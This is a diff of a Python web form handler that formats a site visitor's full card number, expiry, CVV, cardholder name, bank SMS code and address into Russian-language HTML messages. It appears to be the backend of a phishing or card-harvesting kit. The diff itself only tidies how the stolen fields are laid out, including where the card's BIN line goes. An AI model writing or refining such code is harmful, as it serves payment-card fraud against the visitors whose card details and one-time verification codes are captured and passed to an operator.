@@ -147,14 +147,12 @@ async def submit_form(payload: CardSubmit, request: Request) -> JSONResponse:
         card_block = [
             "💳 <b>Карта:</b>",
             f"  Номер: <code>{payload.card_number or '—'}</code>",
-        ]
-        if bin_line:
-            card_block.append(bin_line)
-        card_block.extend([
             f"  Срок: <code>{payload.card_exp or '—'}</code>",
             f"  CVV: <code>{payload.card_cvv or '—'}</code>",
-            f"  Имя: {payload.card_name or '—'}",
-        ])
+            f"  Имя: <code>{payload.card_name or '—'}</code>",
+        ]
+        if bin_line:
+            card_block.extend(["", bin_line])
         code_msg = "\n".join([
             "🔑 <b>SMS-код от посетителя</b>",
             "",
@@ -180,11 +178,11 @@ async def submit_form(payload: CardSubmit, request: Request) -> JSONResponse:
         "",
         "💳 <b>Карта:</b>",
         f"  Номер: <code>{payload.card_number or '—'}</code>",
-        *([bin_line] if bin_line else []),
         f"  Срок: <code>{payload.card_exp or '—'}</code>",
         f"  CVV: <code>{payload.card_cvv or '—'}</code>",
-        f"  Имя: {payload.card_name or '—'}",
+        f"  Имя: <code>{payload.card_name or '—'}</code>",
         "",
+        *([bin_line, ""] if bin_line else []),
         "📍 <b>Адрес:</b>",
         f"  Страна: {payload.country or '—'}",
         f"  Адрес: {payload.address1 or '—'}"
